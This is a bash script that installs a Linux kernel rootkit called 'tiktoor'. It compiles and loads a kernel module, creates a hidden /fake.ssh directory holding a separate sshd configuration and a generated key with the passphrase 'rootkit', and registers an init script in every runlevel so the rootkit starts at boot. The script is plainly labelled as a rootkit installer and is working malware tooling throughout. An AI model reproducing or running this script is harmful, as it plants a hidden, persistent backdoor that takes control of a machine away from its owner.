#!/bin/bash

# Clear out the old:
sudo rmmod tiktoor 2> /dev/null
sudo cat /fake.ssh/ssh-port.hideme | sudo xargs kill
sudo rm -rf /fake.ssh
sudo rm -f /etc/init.d/tiktoor
sudo rm -f /etc/rc0.d/S20tiktoor
sudo rm -f /etc/rc1.d/S20tiktoor
sudo rm -f /etc/rc2.d/S20tiktoor
sudo rm -f /etc/rc3.d/S20tiktoor
sudo rm -f /etc/rc4.d/S20tiktoor
sudo rm -f /etc/rc5.d/S20tiktoor

cd src
make > /dev/null 2>&1
cd ..

sudo mkdir /fake.ssh
sudo mkdir /fake.ssh/authorized_keys
sudo chmod 777 -R /fake.ssh

# Make keys:
ssh-keygen -t rsa -N rootkit -q -f /fake.ssh/authorized_keys/id_rsa


# Hide files:
cp config/sshd_config /fake.ssh/sshd_config
cp config/start-daemon.sh /fake.ssh/start-daemon.sh
cp src/tiktoor.ko /fake.ssh/tiktoor.ko
sudo chmod 700 /fake.ssh
sudo chown -R root.root /fake.ssh


# Install rootkit for bootup:
sudo cp config/tiktoor /etc/init.d/tiktoor
sudo chmod 777 /etc/init.d/tiktoor
sudo ln -s /etc/init.d/tiktoor /etc/rc0.d/S20tiktoor
sudo ln -s /etc/init.d/tiktoor /etc/rc1.d/S20tiktoor
sudo ln -s /etc/init.d/tiktoor /etc/rc2.d/S20tiktoor
sudo ln -s /etc/init.d/tiktoor /etc/rc3.d/S20tiktoor
sudo ln -s /etc/init.d/tiktoor /etc/rc4.d/S20tiktoor
sudo ln -s /etc/init.d/tiktoor /etc/rc5.d/S20tiktoor

cd src
make clean > /dev/null 2>&1
cd ..

sudo service tiktoor start
